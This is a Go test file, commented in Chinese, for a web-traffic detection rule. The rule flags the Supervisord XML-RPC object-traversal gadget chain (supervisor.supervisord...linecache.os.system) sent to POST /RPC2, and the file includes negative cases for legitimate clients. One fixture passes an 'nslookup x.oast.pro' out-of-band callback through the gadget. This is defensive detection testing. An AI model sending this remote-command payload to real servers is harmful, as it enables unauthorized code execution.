package owasp

import "testing"

/**
 * TestSensitiveEndpointBatch5Rules 锁定 204 这条端点规则的命中形态。
 *
 * 收录口径：全语料 140572 条按 endpoints.go 的真实段匹配语义重算，白侧
 * 首请求 / 任一子请求 / 全部子请求三口径均为 0。黑侧 22 条全为 POST /RPC2、
 * body 含 Supervisord 对象遍历 gadget chain，且 r92 基线上全部仍是漏报（fn）。
 */
func TestSensitiveEndpointBatch5Rules(t *testing.T) {
	cases := []struct {
		name   string
		path   string
		method string
		body   string
		wantID string
	}{
		{
			name:   "204 supervisord os.system gadget",
			path:   "/RPC2",
			method: "POST",
			body:   `<methodCall><methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName></methodCall>`,
			wantID: "owasp:endpoint:204",
		},
		{
			name:   "204 带 CRLF 与参数体的真实形态",
			path:   "/RPC2",
			method: "POST",
			body: "<?xml version=\"1.0\"?>\r\n<methodCall>\r\n  <methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>\r\n" +
				"  <params><param><string>nslookup x.oast.pro</string></param></params>\r\n</methodCall>",
			wantID: "owasp:endpoint:204",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			hit, ok := CheckSensitiveEndpointPathWithBody(tc.path, tc.method, []byte(tc.body))
			if !ok {
				t.Fatalf("%s %s 应命中 %s", tc.method, tc.path, tc.wantID)
			}
			if hit.RuleID != tc.wantID {
				t.Errorf("命中规则 = %q，期望 %q", hit.RuleID, tc.wantID)
			}
		})
	}
}

/**
 * TestSensitiveEndpointBatch5Rejects 锁定 204 的反例。
 *
 * 关键在于「合法 supervisord 客户端」形态必须放行：同样的 /RPC2 与 POST，
 * 只要 methodName 是命名方法而不是对象遍历链，就不应命中。
 */
func TestSensitiveEndpointBatch5Rejects(t *testing.T) {
	cases := []struct {
		name   string
		path   string
		method string
		body   string
	}{
		{
			name:   "合法 supervisord 客户端 getState",
			path:   "/RPC2",
			method: "POST",
			body:   `<methodCall><methodName>supervisor.getState</methodName><params/></methodCall>`,
		},
		{
			name:   "合法 supervisord 客户端 getAllProcessInfo",
			path:   "/RPC2",
			method: "POST",
			body:   `<methodCall><methodName>supervisor.getAllProcessInfo</methodName><params/></methodCall>`,
		},
		{
			name:   "普通 XML-RPC 其他方法",
			path:   "/RPC2",
			method: "POST",
			body:   `<methodCall><methodName>system.listMethods</methodName><params/></methodCall>`,
		},
		{
			name:   "标记只出现在路径里（不算请求体命中）",
			path:   "/RPC2/supervisor.supervisord.options.warnings.linecache.os.system",
			method: "POST",
			body:   `<methodCall><methodName>supervisor.getState</methodName></methodCall>`,
		},
		{
			name:   "方法不符",
			path:   "/RPC2",
			method: "GET",
			body:   `<methodCall><methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName></methodCall>`,
		},
		{
			name:   "路径不符",
			path:   "/xmlrpc.php",
			method: "POST",
			body:   `<methodCall><methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName></methodCall>`,
		},
		{
			name:   "空请求体",
			path:   "/RPC2",
			method: "POST",
			body:   "",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			hit, ok := CheckSensitiveEndpointPathWithBody(tc.path, tc.method, []byte(tc.body))
			if ok {
				t.Errorf("%s %s 不应命中，实际命中 %q", tc.method, tc.path, hit.RuleID)
			}
		})
	}
}

/**
 * TestSensitiveEndpointBatch5NoSideEffects 校验 204 不抢走既有规则的归属。
 *
 * /xmlrpc.php 的 system.* 载荷必须仍报 169；204 的闸门不复用 system. 前缀。
 */
func TestSensitiveEndpointBatch5NoSideEffects(t *testing.T) {
	hit, ok := CheckSensitiveEndpointPathWithBody(
		"/xmlrpc.php", "POST", []byte(`<methodCall><methodName>system.listMethods</methodName></methodCall>`))
	if !ok {
		t.Fatal("/xmlrpc.php 的 system.* 载荷应命中既有规则 169")
	}
	if hit.RuleID != "owasp:endpoint:169" {
		t.Errorf("命中规则 = %q，期望 owasp:endpoint:169", hit.RuleID)
	}
}
